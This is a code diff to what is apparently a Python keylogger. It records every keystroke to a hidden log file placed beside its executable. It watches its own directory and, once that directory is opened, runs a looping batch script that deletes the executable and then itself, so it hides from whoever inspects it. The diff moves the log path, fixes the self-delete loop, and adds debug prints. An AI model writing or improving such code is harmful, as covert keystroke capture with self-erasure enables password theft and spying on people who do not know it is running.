@@ -11,7 +11,7 @@ def delete_self():
         @echo off
         :loop
         del "{path_exe}" >nul 2>&1
-        if exist "{bat}" goto loop
+        if exist "{path_exe}" goto loop
         del "{bat}" >nul 2>&1
     """
 
@@ -25,12 +25,17 @@ class DirectoryOpened(FileSystemEventHandler):
         print("deleting self")
         delete_self()
         observer.stop()
+    def on_created(self, event):
+        print("created class")
 
 def on_press(key):
     if key == keyboard.Key.esc:
         return False
+    
+    current_path = os.path.dirname(sys.executable)
+    path = os.path.dirname(current_path) + "/log.txt"
 
-    with open("keylog.txt", "a") as file:
+    with open(path, "a") as file:
         try:
             file.write(f"{key.char}")
         except AttributeError:
@@ -45,12 +50,12 @@ listener = keyboard.Listener(on_press=on_press)
 listener.start()
 # listener.join()     # waits for listener to stop listening
         
-# print(__file__)
 directory_path = os.path.dirname(sys.executable)
 print(directory_path)
 observer = Observer()
 observer.schedule(DirectoryOpened(), path=directory_path, recursive=False)
 observer.start()
+print("observer started")
 
 while observer.is_alive():
     time.sleep(1)
